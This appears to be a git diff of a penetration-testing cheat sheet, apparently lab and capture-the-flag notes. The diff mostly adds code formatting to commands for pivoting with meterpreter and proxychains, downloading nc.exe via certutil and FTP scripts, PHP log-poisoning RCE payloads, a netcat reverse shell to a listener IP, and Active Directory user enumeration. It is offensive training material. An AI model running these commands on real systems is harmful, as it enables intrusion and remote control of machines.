@@ -93,7 +93,7 @@ chmod +s /bin/bash
 > 1. to see if the new network is accessible, run **ping sweep* by typing command --->  ``` use -> multi/gather/ping_sweep ```. use new network and meterpreter session number.
 > 1. to set up socks4a server ---> use auxiliary/server/socks4a
 > 1. edit proxychains.conf, add sock4a proxy with 127.0.0.1 and port 1080.
-> 1. next run proxychains with sudo before nmap. remember proxychains can only get TCP/UDP no ICMP, so use nmap something like sudo proxychains ``` nmap --sT sC -sV -r -v -Pn <IP> ```
+> 1. next run proxychains with sudo before nmap. remember proxychains can only get TCP/UDP no ICMP, so use nmap something like ```sudo proxychains nmap --sT sC -sV -r -v -Pn <IP> ```
   
 #### cgi-bin folder or ShellShock
 > e.g from vulnhub symfonos v3 following gives Rev Shell @ port 9999.\
@@ -178,7 +178,7 @@ chmod +s /bin/bash
 ```
 
 #### Scripts & Utilities
-> 1. Extract IP addresses out a file - sed '/\n/!s/[0-9.]\+/\n&\n/;/^\([0-9]\{1,3\}\.\)\{3\}[0-9]\{1,3\}\n/P;D' {file name}
+> 1. Extract IP addresses out a file - ```bash sed '/\n/!s/[0-9.]\+/\n&\n/;/^\([0-9]\{1,3\}\.\)\{3\}[0-9]\{1,3\}\n/P;D' {file name}```
 
 #### Hashcat Generate Custom Wordlist
 > 1. hashcat --force words -r /usr/share/hashcat/rules/append_specialchars.rule -r /usr/share/hashcat/rules/best64.rule --stdout > hashcardDict.txt
@@ -200,26 +200,25 @@ chmod +s /bin/bash
 
 #### Windws Tricks
 ##### Download a file in Windows via certutil
-> 1. certutil -urlcache -split -f http://192.168.10.100/nc.exe nc.exe
+> 1. ```certutil -urlcache -split -f http://192.168.10.100/nc.exe nc.exe```
 
 ##### Download a file in Windows via FTP client 
-> 1. on Kali box first install module of ftp by running: pip install pyftpdlib
-> 1. start FTP server: python -m pyftpdlib -p 21
-> 1. on Windows box type command: echo open 10.10.16.185 21> ftp.txt&echo USER anonymous >> ftp.txt&echo anonymous>> ftp.txt&echo bin>> ftp.txt&echo GET nc.exe 
-> 1.  ftp.txt&echo bye>> ftp.txt
+> 1. on Kali box first install module of ftp by running: ```pip install pyftpdlib```
+> 1. start FTP server: ```python -m pyftpdlib -p 21```
+> 1. on Windows box type command: ```echo open 10.10.16.185 21> ftp.txt&echo USER anonymous >> ftp.txt&echo anonymous>> ftp.txt&echo bin>> ftp.txt&echo GET nc.exe ftp.txt&echo bye>> ftp.txt```
 > 1. The above command will create a ftp.txt file which will have commands to download the file.
-> 1. Finally run: ftp -v -n -s:ftp.txt
+> 1. Finally run: ```ftp -v -n -s:ftp.txt```
 > 1. and file will be downloaded. 
 
 ##### RCE via PHP system on Windows server - LFI - Log Poision
 > 1. Use "seclist ---> LFI ---> Windows file" for fuzzing/testing LFI
-> 1. A good location can be ---> c:\windows\system32\drivers\etc\hosts
-> 1. To test whether you have you can do RCE, try adding this to UserAgent field--- <?php system('dir');?>
+> 1. A good location can be ---> ```c:\windows\system32\drivers\etc\hosts```
+> 1. To test whether you have you can do RCE, try adding this to ```UserAgent field --- <?php system('dir');?>```
 > 1. Try loading the log file and you should see files listed. 
 
 ##### Shell on Windows via nc.exe
-> 1. Dowload nc.exe --- certutil.exe -urlcache -split -f http://192.168.49.202:445/nc.exe
-> 1. Get reverse shell --- nc.exe 192.168.49.202 4443 -e cmd
+> 1. Dowload nc.exe --- ```certutil.exe -urlcache -split -f http://192.168.49.202:445/nc.exe```
+> 1. Get reverse shell --- ```nc.exe 192.168.49.202 4443 -e cmd```
 
 
 ##### PrivESC Methodology for Windows
@@ -251,7 +250,6 @@ chmod +s /bin/bash
 > 1. ```xfreerdp /u:superadmin /p:Superadmin123$ /v:192.168.203.53:3389```
 > 1. Or use Remmina for GUI 
 
- 
 
 #### Active Directory 
 > 1. Find valid usernames ```/home/jon/Downloads/kerbrute_linux_amd64 userenum --dc 192.168.10.39 -d controller.local /usr/share/seclists/Usernames/top-usernam
